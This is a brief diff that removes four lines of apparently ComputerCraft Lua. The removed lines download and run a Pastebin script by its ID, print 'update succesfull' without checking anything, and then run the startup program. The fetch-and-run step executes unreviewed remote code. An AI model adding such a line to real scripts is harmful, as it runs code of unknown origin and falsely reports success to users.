@@ -1,4 +1,0 @@
-shell.run("pastebin","run","fiVVVj9x")
-sleep(1)
-print("update succesfull")
-os.run({},"startup")
